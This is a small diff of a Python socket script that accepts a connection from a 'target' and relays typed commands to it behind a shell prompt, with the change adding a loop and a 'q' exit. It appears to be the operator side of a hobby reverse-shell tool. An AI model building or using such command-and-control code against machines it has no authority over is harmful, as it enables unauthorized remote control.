@@ -9,8 +9,13 @@ print("Listening for incoming connections")
 target, ip = s.accept()
 print("Target connected!")
 
-message = input("* shell#-%s: " % str(ip))
-target.send(message.encode())
-answer = target.recv(1024).decode() #recieving 1024 bytes
-print(answer)
+while True:
+	message = input("* shell#~%s: " % str(ip))
+	target.send(message.encode())
+	if message == "q":
+		break
+	else:
+		answer = target.recv(1024).decode() #recieving 1024 bytes
+		print(answer)
+
 s.close()
